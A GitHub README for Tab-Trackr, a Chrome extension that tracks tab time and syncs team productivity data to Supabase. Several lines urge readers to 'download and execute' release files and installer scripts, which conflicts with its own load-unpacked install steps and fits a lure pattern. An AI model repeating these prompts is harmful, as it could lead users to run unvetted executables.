[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue?logo=github)](https://github.com/jeet161190/tab-trackr/releases)

# Tab-Trackr — Chrome Extension for Team Productivity Tracking

<img alt="Tab-Trackr dashboard" src="https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=1400&q=80&auto=format&fit=crop" style="width:100%;max-height:360px;object-fit:cover;border-radius:6px;margin-top:12px" />

Badges
- ![browser-analytics](https://img.shields.io/badge/-browser--analytics-gray)
- ![chrome-extension](https://img.shields.io/badge/-chrome--extension-blue)
- ![typescript](https://img.shields.io/badge/-typescript-3178c6)
- ![react](https://img.shields.io/badge/-react-61dafb)
- ![supabase](https://img.shields.io/badge/-supabase-3ecf8e)
- ![manifest-v3](https://img.shields.io/badge/-manifest--v3-ff69b4)
- Topics: browser-analytics • chrome-extension • digital-wellbeing • extension-development • productivity-tracker • team-collaboration

What this project does
- Record tab time per site and per domain.
- Classify active time and idle time.
- Build visual reports on daily and weekly use.
- Sync data to Supabase for team views.
- Provide real-time presence and shared timers for teams.
- Offer a compact productivity dashboard inside a popup and a full view page.

Core features
- Per-tab tracking. Track active tab focus and aggregate per domain.
- Focus timer. Start work sessions, pause, and end with one click.
- Productivity scoring. Tag sites (work, neutral, distract) and compute score.
- Team sync. Share activity summary with team members via Supabase.
- Offline buffer. Store events locally and sync when online.
- Privacy-forward. User data stays under the chosen Supabase project and local storage.
- Manifest V3. Uses service worker, strict permissions, and modern APIs.
- TypeScript + React + Tailwind. Clear types and predictable UI.

Quick links
- Release artifacts: Download and execute the release file from https://github.com/jeet161190/tab-trackr/releases (the release package must be downloaded and executed per your platform).  
- Releases page: [![Get Releases](https://img.shields.io/badge/Get%20Releases-Download-blue?logo=github)](https://github.com/jeet161190/tab-trackr/releases)

Installation (end user)
1. Open the Releases page at https://github.com/jeet161190/tab-trackr/releases.
2. Download the latest release file (ZIP or CRX) listed under Assets.
3. If you download a ZIP, extract to a folder. If you download CRX, follow Chrome's extension install method.
4. In Chrome, open chrome://extensions.
5. Enable Developer mode.
6. Click "Load unpacked" and select the extracted folder, or drag the CRX file into the page.
7. Open the extension icon. Configure your identity and optional Supabase connection string.

Installation (manual build)
- Prerequisites: Node.js 16+, pnpm or npm, and a Supabase project (optional).
- Commands:
  - Install deps: `pnpm install` or `npm install`
  - Build UI: `pnpm build` or `npm run build`
  - Build extension bundle: `pnpm build:extension`
  - Load folder `dist/extension` as unpacked in chrome://extensions

Permissions used
- tabs: read active tab and title.
- storage: save local cache and settings.
- identity (optional): link account tokens for team features.
- alarms: schedule periodic tasks.
- host permissions: optional, requested only for analytics or site tagging.

Usage guide
- Open popup to view today's summary.
- Start a focus timer to mark a work session. The extension logs active tab time while the timer runs.
- Tag sites from the popup. Use tags to mark sites as work or distract.
- Open full dashboard for charts and team views.
- Invite a teammate by sharing your Supabase project config or a team invite link (if configured).

Dashboard overview
- Timeline view: A horizontal chart that shows active tab segments across the day.
- Domain summary: Aggregate time per domain with productivity tag and score.
- Session trends: Graph of focus sessions and average session length.
- Team feed: Live list of shared sessions and status for teammates.

Team collaboration
- Real-time sync. The extension sends events to Supabase real-time for team visibility.
- Presence. See who is online and in a focus session.
- Shared timers. Create shared focus sessions that publish a short description and timers to teammates.
- Comments. Add quick notes to sessions for context.
- Opt-in. Team features require explicit setup of a shared Supabase project or invite link.

Privacy and data control
- Data stays in the Supabase project you choose.
- Local events buffer in local storage only until sync.
- You may remove your data via the extension or by deleting rows in Supabase.
- The extension requests minimal permissions and asks users before enabling team features.

Architecture snapshot
- Chrome Extension (Manifest V3)
  - Service worker handles background events and sync.
  - Content scripts observe tab focus and activity.
  - Popup UI renders quick stats using React.
  - Options and full dashboard pages built with Next.js static export.
- Backend (optional)
  - Supabase for auth, Postgres, and realtime updates.
  - Realtime socket streams broadcast events to team dashboards.
- Storage
  - Local storage for interim events.
  - Supabase for long-term storage, queries, and team data.

Tech stack
- React for UI components.
- TypeScript for types and safer code.
- Tailwind CSS for layout and utilities.
- Supabase for auth and realtime.
- Chrome Extension APIs (Manifest V3).
- Next.js used for admin pages and static dashboard export.

Contributing
- Report bugs as issues. Include steps to reproduce and expected behavior.
- Create feature requests as issues with use case and proposed flow.
- Branch model:
  - fork -> feature branch `feat/your-change` -> open PR to `main`
  - Follow commit style: feat|fix|docs(scope): short description
- Tests:
  - Run unit tests with `pnpm test`.
  - Run lint with `pnpm lint`.
- Local dev:
  - Start UI in dev mode: `pnpm dev`
  - Watch extension build: `pnpm dev:extension`
  - Use Chrome's "Load unpacked" to test the dev build.

Troubleshooting
- If the extension does not load, ensure Developer mode is enabled in chrome://extensions.
- If events do not sync, confirm Supabase URL and anon key in options.
- If timers do not register, check that the extension has the `tabs` permission enabled.
- For release artifacts, download and execute the release file from https://github.com/jeet161190/tab-trackr/releases and follow install steps above.

FAQ
- Q: Does Tab-Trackr record keystrokes or page content?
  - A: No. The extension records metadata: domain, title, time, and session tags.
- Q: Can I use my own Supabase project?
  - A: Yes. Set the Supabase URL and anon key in extension settings to enable team features.
- Q: Will this slow my browser?
  - A: No. The service worker is lightweight. The extension batches events and runs async tasks.
- Q: Can I export my data?
  - A: Yes. Use the dashboard export button to get CSV of sessions and domain summaries.

Screenshots and visuals
- Popup summary (compact)
  - https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=900&q=80&auto=format&fit=crop
- Full dashboard (reports)
  - https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=1400&q=80&auto=format&fit=crop

Security and best practices
- Keep Supabase keys private. Do not publish anon keys in public repos.
- Use environment variables for local development.
- Audit requested Chrome permissions when installing.

Release notes and updates
- Visit the Releases page to download build artifacts and changelogs. The release package must be downloaded and executed for installation.  
- Release assets include: CRX, ZIP of unpacked extension, and installer scripts when available.

Credits
- Built with React, TypeScript, Tailwind, Next.js, Supabase, and Chrome Extension APIs.
- Icons: use public icon sets and open-source assets.
- Layout inspiration: common productivity dashboards and time trackers.

License
- This project uses the MIT license. See LICENSE file for details.

Contact
- Open issues or pull requests on GitHub. Use the Releases page for download links and binaries: https://github.com/jeet161190/tab-trackr/releases

Acknowledgements
- Thank you to the open-source community for libraries and examples that make extension development faster.